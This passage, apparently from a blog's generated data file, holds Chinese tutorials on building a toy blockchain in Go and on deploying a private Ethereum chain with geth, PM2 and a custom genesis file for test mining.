NewBlockchain()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">       添加记录</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    bc.AddBlock(<span class=\"string\">\"Send 1 BTC TO L\"</span>)</span><br><span class=\"line\">    bc.AddBlock(<span class=\"string\">\"Send 2 BTC to R\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">      查看我们最终存储结果</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _, block := <span class=\"keyword\">range</span> bc.blocks &#123;</span><br><span class=\"line\">        fmt.Printf(<span class=\"string\">\"Prev: hash:%x\\n\"</span>, block.PrevBlockHash)</span><br><span class=\"line\">        fmt.Printf(<span class=\"string\">\"Data: %s\\n\"</span>, block.Data)</span><br><span class=\"line\">        fmt.Printf(<span class=\"string\">\"Hash: %x\\n\"</span>, block.Hash)</span><br><span class=\"line\">        fmt.Println()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>以上,创建了一个简单的区块链原型：它仅仅是一个数组构成的一系列区块，每个块都与前一个块相关联.<br>真实的区块链要比这复杂得多,在上面的区块链中，加入新的块非常简单，而且很快，但在比特币中，加入新的块需要很多工作：</p>\n<p>必须要经过完整的运算（工作量证明），获得添加一个新块的权力.并且，区块链是一个没有单一决策者的分布式数据库,一个新的块必须要被网络的其他参与者确认和同意（共识）.还有很重要的一点，上面的区块链目前还没有一笔交易.</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://jeiwan.cc/posts/building-blockchain-in-go-part-1/\" target=\"_blank\" rel=\"noopener\">原文链接：译自 Jeiwan/blockchain_go 的系列文章之一</a></p>\n<p>区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式,    共识机制是区块链系统中实现不同节点之间建立信任、获取权益的数学算法.</p>\n<p>区块链从狭义来讲是一个放在非安全环境中的分布式数据库,这是一个分布式,去中心化的系统,同时有下面的优势:</p>\n<blockquote>\n<ul>\n<li>用密码学的方法来保证已有数据不可能篡改.</li>\n<li>用共识算法来对新增数据达成共识.</li>\n</ul>\n</blockquote>\n<p>在区块链中，存储有效信息的是区块. 比如，比特币区块存储的有效信息，就是比特币交易，交易信息也是所有加密货币的本质. 除此以外，区块还包含了一些技术信息，比如版本，当前时间戳和前一个区块的哈希.</p>\n<p>在这里,我们并不能实现一个像比特币技术规范所说的区块链,而是用golang实现一个简化版的区块链,它只包含一些关键信息.<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Block <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">    Timestamp     <span class=\"keyword\">int64</span>    /时间戳</span><br><span class=\"line\">    Data          []<span class=\"keyword\">byte</span>   /区块存储的信息</span><br><span class=\"line\">    PrevBlockHash []<span class=\"keyword\">byte</span>    /上一个块的hash值</span><br><span class=\"line\">    Hash          []<span class=\"keyword\">byte</span>     /当前块的hash值</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在区块链技术中，Timestamp, PrevBlockHash, Hash 是区块头（block header），区块头是一个单独的数据结构.而交易，也就是这里的 Data 信息, 是一个单独的数据结构.在这里为了简化,把这里的  Data 和交易数据进行了混合.</p>\n<p>hash值计算是区块链一个非常重要的部分.正是由于这个特性，才使得区块链是安全的.计算一个hash,是在计算上非常困难的一个操作.即使在矿机上，也要花费一定的时间 .这样的架构设计，使得加入新的区块十分困难，就可以保证区块一旦被加入以后，很难再进行修改.</p>\n<p>现在,我们只需要使用区块结构的Timestamp,Data和PrevBlockHash字段,并将它们相互连接起来,并在连接后的结果上计算一个sha-256的hash.<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(b *Block)</span> <span class=\"title\">SetHash</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">  timestamp := []<span class=\"keyword\">byte</span>(strconv.FormatInt(b.Timestamp, <span class=\"number\">10</span>))</span><br><span class=\"line\">  headers := bytes.Join([][]<span class=\"keyword\">byte</span>&#123;b.PrevBlockHash, b.Data, timestamp&#125;, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">  hash := sha256.Sum256(headers)</span><br><span class=\"line\"></span><br><span class=\"line\">  b.Hash = hash[:]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如上代码,我们使用 SetHash 的方法完成计算.</p>\n<p>按照 Golang 的惯例，我们会实现一个用于简化创建一个区块的函数：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>, prevBlockHash []<span class=\"keyword\">byte</span>)</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">  block := &amp;Block&#123;time.Now().Unix(), []<span class=\"keyword\">byte</span>(data), prevBlockHash, []<span class=\"keyword\">byte</span>&#123;&#125;&#125;</span><br><span class=\"line\">  block.SetHash()</span><br><span class=\"line\">  <span class=\"keyword\">return</span> block</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>到了这里,整个区块部分已经完成.</p>\n<p>下面就该实现区块链了,区块链本质上是一个有着特定结构的数据库，是一个有序后向连接的列表.也就是说，区块按照插入的顺序进行存储，每个块都被连接到前一个块,这样的结构，能够让我们快速地获取链上的最新块，并且高效地通过哈希来检索一个块,</p>\n<p>在 Go中，通过一个 array 和 map 来实现这个结构：array 存储有序的哈希（Golang 中 array 是有序的），map 存储 hask -&gt; block 对(Golang 中, map 是无序的). 在基本的原型阶段，现在还不需要通过哈希来获取块,所以这里只用到了 array.<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Blockchain <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">  blocks []*Block</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>现在，给它添加一个块：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(bc *Blockchain)</span> <span class=\"title\">AddBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>)</span></span> &#123;</span><br><span class=\"line\">  prevBlock := bc.blocks[<span class=\"built_in\">len</span>(bc.blocks)<span class=\"number\">-1</span>]</span><br><span class=\"line\">  newBlock := NewBlock(data, prevBlock.Hash)</span><br><span class=\"line\">  bc.blocks = <span class=\"built_in\">append</span>(bc.blocks, newBlock)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>为了加入一个新的块，必须要有一个已有的块，现在我们的链是空的，一个块也没有,所以，在区块链中，必须有一个创世区块(genesis block)，也就是链中的第一个块，用下面的方法来创建一个创世块：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewGenesisBlock</span><span class=\"params\">()</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> NewBlock(<span class=\"string\">\"Genesis Block\"</span>, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">用一个函数来创建有创世块的区块链：</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlockchain</span><span class=\"params\">()</span> *<span class=\"title\">Blockchain</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;Blockchain&#123;[]*Block&#123;NewGenesisBlock()&#125;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>检查区块链是否正常工作：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">  bc := NewBlockchain()</span><br><span class=\"line\"></span><br><span class=\"line\">  bc.AddBlock(<span class=\"string\">\"Send 1 BTC to Ivan\"</span>)</span><br><span class=\"line\">  bc.AddBlock(<span class=\"string\">\"Send 2 more BTC to Ivan\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> _, block := <span class=\"keyword\">range</span> bc.blocks &#123;</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">\"Prev. hash: %x\\n\"</span>, block.PrevBlockHash)</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">\"Data: %s\\n\"</span>, block.Data)</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">\"Hash: %x\\n\"</span>, block.Hash)</span><br><span class=\"line\">    fmt.Println()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>输出结果:</p>\n<p><img src=\"/images/b1.png\" alt=\"\"></p>\n<p>完整代码:<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">    <span class=\"string\">\"bytes\"</span></span><br><span class=\"line\">    <span class=\"string\">\"crypto/sha256\"</span></span><br><span class=\"line\">    <span class=\"string\">\"fmt\"</span></span><br><span class=\"line\">    <span class=\"string\">\"strconv\"</span></span><br><span class=\"line\">    <span class=\"string\">\"time\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Block <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">    Timestamp     <span class=\"keyword\">int64</span></span><br><span class=\"line\">    Data          []<span class=\"keyword\">byte</span></span><br><span class=\"line\">    PrevBlockHash []<span class=\"keyword\">byte</span></span><br><span class=\"line\">    Hash          []<span class=\"keyword\">byte</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(b *Block)</span> <span class=\"title\">SetHash</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    timestamp := []<span class=\"keyword\">byte</span>(strconv.FormatInt(b.Timestamp, <span class=\"number\">10</span>))</span><br><span class=\"line\">    headers := bytes.Join([][]<span class=\"keyword\">byte</span>&#123;b.PrevBlockHash, b.Data, timestamp&#125;, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">    hash := sha256.Sum256(headers)</span><br><span class=\"line\">    b.Hash = hash[:]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    初始化第一个块</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>, prevBlockHash []<span class=\"keyword\">byte</span>)</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">    block := &amp;Block&#123;time.Now().Unix(), []<span class=\"keyword\">byte</span>(data), prevBlockHash, []<span class=\"keyword\">byte</span>&#123;&#125;&#125;</span><br><span class=\"line\">    block.SetHash()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> block</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Blockchain <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">    blocks []*Block</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    添加 区块</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(bc *Blockchain)</span> <span class=\"title\">AddBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>)</span></span> &#123;</span><br><span class=\"line\">    prevBlock := bc.blocks[<span class=\"built_in\">len</span>(bc.blocks)<span class=\"number\">-1</span>]</span><br><span class=\"line\">    newBlock := NewBlock(data, prevBlock.Hash)</span><br><span class=\"line\">    bc.blocks = <span class=\"built_in\">append</span>(bc.blocks, newBlock)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewGenesisBlock</span><span class=\"params\">()</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> NewBlock(<span class=\"string\">\"Genesis Block创始块\"</span>, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    用创始块创建一个区块链的函数</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlockchain</span><span class=\"params\">()</span> *<span class=\"title\">Blockchain</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;Blockchain&#123;[]*Block&#123;NewGenesisBlock()&#125;&#125; <span class=\"comment\">/*我不太理解这种语法,层层深入？*/</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">       初始化</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    bc := NewBlockchain()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">       添加记录</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    bc.AddBlock(<span class=\"string\">\"Send 1 BTC TO L\"</span>)</span><br><span class=\"line\">    bc.AddBlock(<span class=\"string\">\"Send 2 BTC to R\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">      查看我们最终存储结果</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _, block := <span class=\"keyword\">range</span> bc.blocks &#123;</span><br><span class=\"line\">        fmt.Printf(<span class=\"string\">\"Prev: hash:%x\\n\"</span>, block.PrevBlockHash)</span><br><span class=\"line\">        fmt.Printf(<span class=\"string\">\"Data: %s\\n\"</span>, block.Data)</span><br><span class=\"line\">        fmt.Printf(<span class=\"string\">\"Hash: %x\\n\"</span>, block.Hash)</span><br><span class=\"line\">        fmt.Println()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>以上,创建了一个简单的区块链原型：它仅仅是一个数组构成的一系列区块，每个块都与前一个块相关联.<br>真实的区块链要比这复杂得多,在上面的区块链中，加入新的块非常简单，而且很快，但在比特币中，加入新的块需要很多工作：</p>\n<p>必须要经过完整的运算（工作量证明），获得添加一个新块的权力.并且，区块链是一个没有单一决策者的分布式数据库,一个新的块必须要被网络的其他参与者确认和同意（共识）.还有很重要的一点，上面的区块链目前还没有一笔交易.</p>\n"},{"title":"部署以太坊私有链并挖矿","comments":0,"date":"2018-03-16T09:35:07.000Z","img":null,"_content":"\n##定义\n\n* 以太坊是一个区块链应用开发平台，基于以太坊构建的网络和智能合约语言，可以实现各种各样的与现实世界接近的分布式应用（DApp）.\n\n* 智能合约是一段代码和数据的集合，可以部署以太坊网络上运行。如果做比喻的话智能合约更像是JAVA程序，JAVA程序通过JAVA虚拟机（JVM）将代码解释字节进行执行，以太坊的智能合约通过以太坊虚拟机（EVM）解释成字节码进行执行.\n\n* 以太坊虚拟机（EVM）是以太坊中智能合约的运行环境。它不仅被沙箱封装起来，事实上它被完全隔离运行，也就是说运行在EVM内部的代码不能接触到网络、文件系统或者其它进程，甚至智能合约之间也只有有限的调用.\n\n## 1.部署以太坊节点\n\n### 1.1 geth\ngeth全称 go-ethereum , 它是一个用Go语言实现运行在以太坊完整节点上的命令行接口，安装并运行了geth，可以成为以太坊正式链的节点并且可以实现挖矿,转账,创建智能合约等.\n\n### 1.2 geth节点服务器部署\n安装系统依赖库:\n\n```\nsudo apt-get update\nsudo apt-get install build-essential git unzip wget ntp\n```\n\n添加以太坊官方 APT 源，并安装以太坊客户端:\n\n```\nsudo apt-get install software-properties-common\nsudo add-apt-repository -y ppa:ethereum/ethereum\nsudo apt-get update\nsudo apt-get install ethereum\n```\n\n这里使用的是ubuntu系统,如果你使用的是centos,也可以直接下载编译好的二进制文件直接运行或自行下载源码进行编译.\n\n> geth官方下载地址 : https://geth.ethereum.org/downloads \n\n>  https://gethstore.blob.core.windows.net/builds/geth-linux-amd64-1.8.2-b8b9f7f4.tar.gz\n\n> geth github : https://github.com/ethereum/go-ethereum\n\n运行:\n\n```\n $ geth console\n```\n\n或者 geth account new 获取账号:\n\n```\nroot@VM-0-5-ubuntu:~# geth account new\nYour new account is locked with a password. Please give a password. Do not forget this password.\nPassphrase: \nRepeat passphrase: \nAddress: {747998fa9d6253f36de8b8b32c29fec58ec82879}\n```\n\n### 1.3 后台进程管理\n如果需要长期运行以太坊全数据节点或同步区块,就要保证 geth客户端一直在后台运行,所以需要一个后台进程管理工具,这里使用以太坊开发者推荐的PM2配置geth后台进程管理;崩溃自启和开机自启.\n\nPM2是基于Nodejs的,我们首先来安装Nodejs,在使用npm安装pm2 :\n\nsudo apt-get install npm\nsudo npm install n -g\nsudo n 8.9.4\nnode -v\nsudo npm install pm2\n\n上段代码里,n是nodejs的包管理器,可以更换不同的nodejs版本,这里使用的是8.9.4的长期支持版.\n\n正确安装pm2后,创建pm2配置文件,配置文件以json的形式加载:\n\n```\nvim geth.json\n\n[\n  {\n    \"name\"              : \"geth\",        // 应用名称\n    \"cwd\"               : \"/usr/bin/\",   // 当前工作路径\n    \"script\"            : \"geth\",       // 实际启动脚本\n    \"args\"              : \"--rpc --fast --maxpeers 100 --cache 512 --networkid 56\",\n    \"log_date_format\"   : \"YYYY-MM-DD HH:mm Z\",\n    \"merge_logs\"        : false,\n    \"watch\"             : false,\n    \"max_restarts\"      : 10,\n    \"exec_interpreter\"  : \"none\",\n    \"exec_mode\"         : \"fork_mode\"\n  }\n]\n\npm2 start geth.json              //pm2后台启动geth\n```\n\n到这里已经后台启动了geth客户端,使用pm2 logs查看实时运行日志.\n\n![](/images/geth.png)\n\n## 2.搭建私有连并挖矿\n\n做一些测试工作的时候, 为了方便控制以及更快的进入真正的测试工作,需要搭建一个私有的以太坊网络.\n而以太坊节点之间能够互相链接需要满足这些条件:\n相同的协议版本\n相同的networkid,所以搭建私有网络最方便的方法就是通过geth命令中的 --networkid 选项,设置一个与主网不同的networkid(主网的networkid为1),这也是官方推荐的方法.\n下面开始建立私有以太坊网络 , 设置创世区块文件,也是一个json的文件:\n\n```\nvim genesis.json\n\n{\n  \"coinbase\"   : \"0x2fa91e94990a5e46589e07725991b6fa013e4b60\",\n  \"difficulty\" : \"200000000\",\n  \"extraData\"  : \"\",\n  \"gasLimit\"   : \"0x2fefd8\",\n  \"nonce\"      : \"0xdeadbeefdeadbeef\",\n    \"config\":{\n      \"chainId\":56,\n      \"homesteadBlock\":0,\n      \"eip155Block\":0,\n      \"eip158Block\":0\n\n},\n  \"mixhash\"    : \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n  \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n  \"timestamp\"  : \"0x00\",\n  \"alloc\"      : {}\n}\n```\n\n初始化创世纪节点,并设置data目录:\n\n```\ngeth --datadir ./data/00 init genesis.json \n```\n\n启动节点, 加上console 表示启动后,启用命令行:\n\n```\ngeth --datadir ./data/00 --networkid 56 console\n```\n\n至此,私有链已经启动并进入命令行.\n\n![](/images/geth2.png)\n\n现在私有网络就搭建成功,接下来就可以在这个刚搭建的私有网络中执行进行挖矿了,\n首先必须有一个账户,输入下面的命令,新建一个账户:\n\n```\n> personal.newAccount(\"123456\")\n\"0x0d00579784bc64009af229f325c018c2acab9341\"\n```\n\n有了账户,下面就可以开始挖矿,继续在命令行书输出:\n\n```\n> miner.start()\nINFO [03-16|15:54:25] Updated mining threads          threads=0\nINFO [03-16|15:54:25] Transaction pool price threshold updated price=18000000000\nINFO [03-16|15:54:25] Etherbase automatically configured    address=0x0D00579784bC64009af229f325c018C2AcAB9341\n> INFO [03-16|15:54:25] Starting mining operation \nINFO [03-16|15:54:25] Commit new mining work          number=1 txs=0 uncles=0 elapsed=309.196µs\nINFO [03-16|15:54:28] Generating DAG in progress        epoch=0 \n```\n\n挖矿后，会不停刷屏，输入miner.stop()即停止，不用管刷屏导致的命令不全，命令会正常执行.\n\n\n\n\n\n\n\n","source":"_posts/部署以太坊私有链并挖矿.md","raw":"---\ntitle: 部署以太坊私有链并挖矿\ncomments: false\ndate: 2018-03-16 17:35:07\ncategories: 矿池\ntags:\n- lucas556\n- 矿池\n- 区块链\n- 以太坊\n- 私有链\n- 挖矿\nimg:\n---\n\n##定义\n\n* 以太坊是一个区块链应用开发平台，基于以太坊构建的网络和智能合约语言，可以实现各种各样的与现实世界接近的分布式应用（DApp）.\n\n* 智能合约是一段代码和数据的集合，可以部署以太坊网络上运行。如果做比喻的话智能合约更像是JAVA程序，JAVA程序通过JAVA虚拟机（JVM）将代码解释字节进行执行，以太坊的智能合约通过以太坊虚拟机（EVM）解释成字节码进行执行.\n\n* 以太坊虚拟机（EVM）是以太坊中智能合约的运行环境。它不仅被沙箱封装起来，事实上它被完全隔离运行，也就是说运行在EVM内部的代码不能接触到网络、文件系统或者其它进程，甚至智能合约之间也只有有限的调用.\n\n## 1.部署以太坊节点\n\n### 1.1 geth\ngeth全称 go-ethereum , 它是一个用Go语言实现运行在以太坊完整节点上的命令行接口，安装并运行了geth，可以成为以太坊正式链的节点并且可以实现挖矿,转账,创建智能合约等.\n\n### 1.2 geth节点服务器部署\n安装系统依赖库:\n\n```\nsudo apt-get update\nsudo apt-get install build-essential git unzip wget ntp\n```\n\n添加以太坊官方 APT 源，并安装以太坊客户端:\n\n```\nsudo apt-get install software-properties-common\nsudo add-apt-repository -y ppa:ethereum/ethereum\nsudo apt-get update\nsudo apt-get install ethereum\n```\n\n这里使用的是ubuntu系统,如果你使用的是centos,也可以直接下载编译好的二进制文件直接运行或自行下载源码进行编译.\n\n> geth官方下载地址 : https://geth.ethereum.org/downloads \n\n>  https://gethstore.blob.core.windows.net/builds/geth-linux-amd64-1.8.2-b8b9f7f4.tar.gz\n\n> geth github : https://github.com/ethereum/go-ethereum\n\n运行:\n\n```\n $ geth console\n```\n\n或者 geth account new 获取账号:\n\n```\nroot@VM-0-5-ubuntu:~# geth account new\nYour new account is locked with a password. Please give a password. Do not forget this password.\nPassphrase: \nRepeat passphrase: \nAddress: {747998fa9d6253f36de8b8b32c29fec58ec82879}\n```\n\n### 1.3 后台进程管理\n如果需要长期运行以太坊全数据节点或同步区块,就要保证 geth客户端一直在后台运行,所以需要一个后台进程管理工具,这里使用以太坊开发者推荐的PM2配置geth后台进程管理;崩溃自启和开机自启.\n\nPM2是基于Nodejs的,我们首先来安装Nodejs,在使用npm安装pm2 :\n\nsudo apt-get install npm\nsudo npm install n -g\nsudo n 8.9.4\nnode -v\nsudo npm install pm2\n\n上段代码里,n是nodejs的包管理器,可以更换不同的nodejs版本,这里使用的是8.9.4的长期支持版.\n\n正确安装pm2后,创建pm2配置文件,配置文件以json的形式加载:\n\n```\nvim geth.json\n\n[\n  {\n    \"name\"              : \"geth\",        // 应用名称\n    \"cwd\"               : \"/usr/bin/\",   // 当前工作路径\n    \"script\"            : \"geth\",       // 实际启动脚本\n    \"args\"              : \"--rpc --fast --maxpeers 100 --cache 512 --networkid 56\",\n    \"log_date_format\"   : \"YYYY-MM-DD HH:mm Z\",\n    \"merge_logs\"        : false,\n    \"watch\"             : false,\n    \"max_restarts\"      : 10,\n    \"exec_interpreter\"  : \"none\",\n    \"exec_mode\"         : \"fork_mode\"\n  }\n]\n\npm2 start geth.json              //pm2后台启动geth\n```\n\n到这里已经后台启动了geth客户端,使用pm2 logs查看实时运行日志.\n\n![](/images/geth.png)\n\n## 2.搭建私有连并挖矿\n\n做一些测试工作的时候, 为了方便控制以及更快的进入真正的测试工作,需要搭建一个私有的以太坊网络.\n而以太坊节点之间能够互相链接需要满足这些条件:\n相同的协议版本\n相同的networkid,所以搭建私有网络最方便的方法就是通过geth命令中的 --networkid 选项,设置一个与主网不同的networkid(主网的networkid为1),这也是官方推荐的方法.\n下面开始建立私有以太坊网络 , 设置创世区块文件,也是一个json的文件:\n\n```\nvim genesis.json\n\n{\n  \"coinbase\"   : \"0x2fa91e94990a5e46589e07725991b6fa013e4b60\",\n  \"difficulty\" : \"200000000\",\n  \"extraData\"  : \"\",\n  \"gasLimit\"   : \"0x2fefd8\",\n  \"nonce\"      : \"0xdeadbeefdeadbeef\",\n    \"config\":{\n      \"chainId\":56,\n      \"homesteadBlock\":0,\n      \"eip155Block\":0,\n      \"eip158Block\":0\n\n},\n  \"mixhash\"    : \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n  \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n  \"timestamp\"  : \"0x00\",\n  \"alloc\"      : 